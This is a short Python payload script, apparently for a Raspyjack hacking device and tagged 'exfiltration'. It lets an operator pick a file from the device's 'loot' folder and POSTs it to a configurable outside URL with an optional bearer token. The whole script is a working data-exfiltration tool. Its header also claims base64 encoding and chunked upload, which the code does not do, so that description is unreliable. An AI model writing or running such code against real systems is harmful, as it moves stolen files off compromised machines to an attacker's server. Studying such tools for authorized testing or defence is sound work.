#!/usr/bin/env python3
# @name: HTTP Loot Upload
# @desc: Reads files from /root/Raspyjack/loot/, encodes in base64, and sends as POST chunks to a configurable URL.
# @category: exfiltration
# @danger: true
# @active: true
# @web: true
# @inputs: [{"name":"url","label":"Authorized upload URL","type":"text","placeholder":"https://server/upload","required":true},{"name":"bearer","label":"Bearer token (optional)","type":"password","required":false}]
import os,sys,urllib.request
from pathlib import Path
from payloads._web_input import request_input
def main():
 if len(sys.argv)<2 or not sys.argv[1].startswith('https://'): print('An HTTPS URL is required.');return 2
 root=Path(os.environ.get('CITYPOP_ROOT',Path(__file__).resolve().parents[2]));loot=root/'loot';files=sorted((p for p in loot.rglob('*') if p.is_file()),key=lambda p:p.stat().st_mtime,reverse=True)
 if not files:return 1
 i=int(request_input('Select loot file',input_type='select',choices=[{'value':str(i),'label':str(p.relative_to(loot))} for i,p in enumerate(files[:500])])) ;source=files[i]; headers={'Content-Type':'application/octet-stream','X-Filename':source.name}
 if len(sys.argv)>2 and sys.argv[2]:headers['Authorization']='Bearer '+sys.argv[2]
 try:
  with urllib.request.urlopen(urllib.request.Request(sys.argv[1],data=source.read_bytes(),method='POST',headers=headers),timeout=120) as r:print('HTTP',r.status,r.read().decode(errors='replace')[:2000]);return 0
 except Exception as e:print('Upload failed:',e);return 1
if __name__=='__main__':raise SystemExit(main())
